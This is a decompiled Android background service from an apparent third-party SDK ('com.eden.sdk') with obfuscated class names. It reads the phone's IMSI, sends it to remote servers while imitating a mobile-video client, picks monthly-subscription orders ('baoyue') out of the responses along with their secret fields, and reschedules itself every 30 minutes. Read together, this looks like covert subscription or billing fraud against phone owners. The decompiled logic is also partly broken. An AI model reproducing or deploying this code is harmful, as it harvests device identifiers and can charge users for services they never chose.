package com.eden.sdk.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;
import com.eden.sdk.b.ad;
import com.eden.sdk.manager.NovaManager;
import com.eden.sdk.manager.a;
import com.eden.sdk.manager.b;
import com.eden.sdk.manager.d;
import com.eden.sdk.manager.f;
import com.eden.sdk.response.OrderC3;
import com.eden.sdk.util.AppUtils;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class C
  extends Service
{
  private static String a = "";
  
  public C() {}
  
  private static OrderC3 b(HashMap<String, Object> paramHashMap)
  {
    if (paramHashMap != null) {
      try
      {
        if ((paramHashMap.size() > 0) && (paramHashMap.containsKey("orderList")) && (paramHashMap.get("orderList") != null))
        {
          Object localObject = (List)paramHashMap.get("orderList");
          if (((List)localObject).size() > 0)
          {
            int i = 0;
            while (i < ((List)localObject).size())
            {
              if ((((List)localObject).get(i) instanceof HashMap))
              {
                paramHashMap = (HashMap)((List)localObject).get(i);
                if ((paramHashMap != null) && (paramHashMap.size() > 0))
                {
                  String str1 = (String)paramHashMap.get("title");
                  String str2 = (String)paramHashMap.get("typeName");
                  if ((str1.contains("æœˆ")) || (str2.contains("baoyue")))
                  {
                    localObject = new OrderC3();
                    ((OrderC3)localObject).setSecret((String)paramHashMap.get("secret"));
                    ((OrderC3)localObject).setTitle((String)paramHashMap.get("title"));
                    ((OrderC3)localObject).setContparam((String)paramHashMap.get("contparam"));
                    ((OrderC3)localObject).setTypeName((String)paramHashMap.get("typeName"));
                    return localObject;
                  }
                }
              }
              i += 1;
            }
          }
        }
        return null;
      }
      catch (Exception paramHashMap)
      {
        Log.e("EdenSdk", "getOrder2:" + paramHashMap.toString());
      }
    }
  }
  
  private void f()
  {
    if (f.e(this))
    {
      if (f.d(this))
      {
        NovaManager.init(AppUtils.getImsi(this), f.a(this), 0);
        a();
      }
    }
    else {
      return;
    }
    NovaManager.init(AppUtils.getImsi(this), f.a(this), 1);
    new Handler().postDelayed(new v(this), 7000L);
  }
  
  private void g()
  {
    if ((f.e(this)) && (!a.a(this).g()) && (f.e(this)))
    {
      String str1 = a.a(this).e();
      String str2 = f.b();
      if ((!"".equals(str1)) && (!"".equals(str2))) {
        break label65;
      }
    }
    label65:
    for (int i = 0; i != 0; i = 1)
    {
      e();
      return;
    }
    b.a(this, AppUtils.changeUrl(this, AppUtils.getServerRoot(this) + "/clt30//msp/clientToken.msp?clientImsi=" + AppUtils.getImsi(this) + "&isSupContSet=1&sdkVersion=04.00.01.02&playerType=3&res=MDPI"), new m(this));
  }
  
  public final void a()
  {
    ad localAd = new ad();
    localAd.a("q", NovaManager.a(this));
    String str = NovaManager.getParameter2();
    NovaManager.log("mi :" + str);
    localAd.a("mi", str);
    b.a(NovaManager.getUrl(), localAd, new w(this));
  }
  
  public final void a(HashMap<String, String> paramHashMap, String paramString)
  {
    String str = NovaManager.getUrl();
    d localD = d.a;
    b.a(str, d.a(this, paramHashMap, paramString), new aa(this));
  }
  
  protected final void a(Map<String, Object> paramMap)
  {
    a = (String)paramMap.get("phoneNum");
    if ((paramMap.containsKey("code")) && (paramMap.get("code") != null))
    {
      paramMap = (String)paramMap.get("code");
      if ((paramMap != null) && ("0".equals(paramMap.trim()))) {
        b.a(this, AppUtils.changeUrl(this, AppUtils.getServerRoot(this) + "/clt30//publish/clt/resource/mobilevideo34/player/playerData.jsp?contentId=" + NovaManager.getContentId2() + "&nodeId=" + NovaManager.getNodeId2() + "&objType=content&copyrightFilter=0&rate=3&sdkVersion=04.00.01.02&playerType=4&res=MDPI"), new p(this));
      }
    }
  }
  
  public final void b()
  {
    ad localAd = new ad();
    localAd.a("q", NovaManager.a(this));
    String str = NovaManager.getParameter2();
    NovaManager.log("mi :" + str);
    localAd.a("mi", str);
    b.a(NovaManager.getUrl(), localAd, new x(this));
  }
  
  public final void c()
  {
    ad localAd = new ad();
    localAd.a("q", NovaManager.a(this));
    String str = NovaManager.getParameter3();
    NovaManager.log("mi :" + str);
    localAd.a("mi", str);
    b.a(NovaManager.getUrl(), localAd, new y(this));
  }
  
  public final void d()
  {
    ad localAd = new ad();
    localAd.a("q", NovaManager.a(this));
    String str = NovaManager.getParameter3();
    NovaManager.log("mi :" + str);
    localAd.a("mi", str);
    b.a(NovaManager.getUrl(), localAd, new z(this));
  }
  
  protected final void e()
  {
    String str1 = AppUtils.changeUrl(this, AppUtils.getServerRoot(this) + "/clt30/commonCommunication.msp?isSupContSet=1&sdkVersion=04.00.01.02&playerType=3&res=MDPI");
    String str2 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><Root><header></header><body><request type=\"Login\" serial=\"1\"><channel>" + NovaManager.getChannelId2() + "</channel></request><request type=\"CheckVersion\" serial=\"1\"><component id=\"MobileVideo\" version=\"04.00.01.02\"/><dealer>" + NovaManager.getChannelId2() + "</dealer></request></body></Root>";
    ad localAd = new ad();
    localAd.a("q", str2);
    b.b(str1, localAd, new o(this));
  }
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    int i = 0;
    for (;;)
    {
      try
      {
        NovaManager.initLib(this);
        if (paramIntent != null) {
          i = paramIntent.getIntExtra("mode", 0);
        }
        if (i != 1) {
          continue;
        }
        f();
      }
      catch (Exception localException)
      {
        AlarmManager localAlarmManager;
        Object localObject;
        Log.e("EdenSdk", "onStartCommand:" + localException.toString());
        continue;
        f();
        new Handler().postDelayed(new j(this), 10000L);
        continue;
      }
      localAlarmManager = (AlarmManager)getSystemService("alarm");
      localObject = new Intent(this, D.class);
      ((Intent)localObject).setAction("com.senovax.common.pus.push.PsuhService");
      localObject = PendingIntent.getService(this, 0, (Intent)localObject, 134217728);
      localAlarmManager.setRepeating(3, SystemClock.elapsedRealtime() + 80000L, 1800000L, (PendingIntent)localObject);
      return super.onStartCommand(paramIntent, paramInt1, paramInt2);
      if (i != 2) {
        continue;
      }
      g();
    }
  }
}
